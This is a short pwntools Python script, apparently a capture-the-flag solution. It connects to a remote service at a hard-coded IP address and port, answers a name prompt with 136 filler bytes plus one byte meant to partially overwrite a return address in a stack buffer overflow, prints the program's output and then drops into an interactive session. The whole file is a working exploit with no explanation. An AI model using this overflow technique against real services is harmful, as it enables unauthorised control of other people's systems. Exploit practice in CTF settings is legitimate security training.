from pwn import *


io = remote("45.76.91.112", 10071)
io.recvuntil("What is your name?")
password = b'A' * 136 + p8(0x40)
io.send(password)

while True:
	try:
		# use "readline" from pwntools
		line = str(io.recvline())
		print(line)
	except:
		# could not read line => program exited
		break

io.interactive()